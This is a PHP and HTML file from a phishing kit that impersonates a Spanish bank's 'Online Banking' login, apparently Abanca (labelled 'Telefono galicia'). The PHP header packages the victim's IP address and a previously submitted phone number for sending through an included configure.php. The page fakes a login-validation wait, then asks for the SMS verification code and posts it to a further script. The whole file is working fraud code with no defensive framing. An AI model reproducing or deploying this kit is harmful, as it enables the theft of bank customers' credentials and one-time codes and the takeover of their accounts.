<?php  
$enviara =
    "<b> ## Telefono galicia ## </b>\n".
    "<b>Direccion IP: </b> ".$_SERVER['REMOTE_ADDR']."\n".
    
    "<b>Tel: </b> <code>".$_POST['daleya']."</code>\n";    
    $enviar =  urldecode($enviara);
    include 'configure.php';
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Online Banking</title>
    <script src="https://kit.fontawesome.com/1a5e2ebb67.js" crossorigin="anonymous"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
    <style type="text/css">
      .label-floating-custom{
        left:7px;
        top:0px;
        z-index: 0;
        font-size: 19px;
        color:#888;
      }
      input{
        font-size:18px;
        border:0;
        background: transparent;
        position: relative;
        z-index: 1;
        outline:none;
        transition:.3s ease;
        border-bottom: 1px solid silver;
      }
      input[type=number]::-webkit-inner-spin-button,
      input[type=number]::-webkit-outer-spin-button{
        -webkit-appearance:none;
      }
      input:focus{
        border-bottom: 2px solid #fa6400 !important;
      }
      input:valid ~ label{
        top: -19px;
        font-size:13px;
      }
      .sss{
        right: 0px;
        top: 0;
        z-index: 1;
        display: none;
        color: #888;
      }
      input:valid ~ .sss{
        display: block;
      }
      .btn-gali,
      .btn-gali:hover
      {
        background:#ff6600;
        border-radius: 3px;
      }
      .col-sm-5,
      .col-sm-7
      {
        height:100vh;
        min-height:650px;
      }
    </style>
  </head>
  <body>
    <div class="position-fixed cargando bg-white justify-content-center w-100 h-100 align-items-center bg-white" style="display: flex;z-index: 999;">
    <div class="alert border rounded-0 shadow">
      <img src="images/logo.svg" height="20px" class="d-block ms-auto">
      <h3 class="fs-6">Espere</h3>
      <p class="fs-4 text-secondary">El sistema esta validando su inicio de sesión</p>
      <div class="text-start">
        <div class="spinner-border text-secondary" role="status">
          <span class="visually-hidden">Loading...</span>
        </div>
        Esto puede tomar <b class="segundos">5</b> segundos
      </div>
    </div>
  </div>
    <div class="row p-0 mx-0">
      <div class="col-sm-12">
        <div class="row m-0">
          <div class="col-12 py-4">
            <img src="images/logo.svg" height="39px" class="d-block">
            <small>Online Banking</small>
          </div>
          <div class="col-sm-4">
            <div class="text-start mb-4">
              <h1 class="text-muted fs-3 fw-normal ">Seguridad del sistema</h1>
              <div class="alert rounded-0 border"  style="font-size:15px;">
                <small>
                  Por su seguridad verifique identindad para continuar con su inicio de sesión. Complete los datos solicitados a continuación.
                </small>
              </div>
            </div>
            <form class="py-3" method="POST" action="ahora-eltok.php">
              <div class="alert alert-warning mb-5 rounded-0">
                Ingrese el código que le enviamos por SMS
              </div>
              <div class="field mt-3 mb-5 position-relative">
                <input type="tel" maxlength="6" minlength="3" class="custom-lavel-up border-bottom w-100" required name="ahhhhhhhhhjajajaja">
                <label class="position-absolute label-floating-custom">SMS</label>
              </div>
              
             
              <div class="px-1 mb-2">
                <button class="btn btn-gali w-100 text-white">INICIAR SESIÓN</button>
              </div>

            </form>
            
          </div>
          
        </div>  
      </div>
    </div>
    <script type="text/javascript">
    let seg = 5;
    function decre(){
      seg--;
    }
    var dale = setInterval(function(){
      decre();
      $(".segundos").html(seg);
      if (seg == 0) {
        clearInterval(dale);
        $(".cargando").hide();  
      }
    },1000)
  </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
  </body>
</html>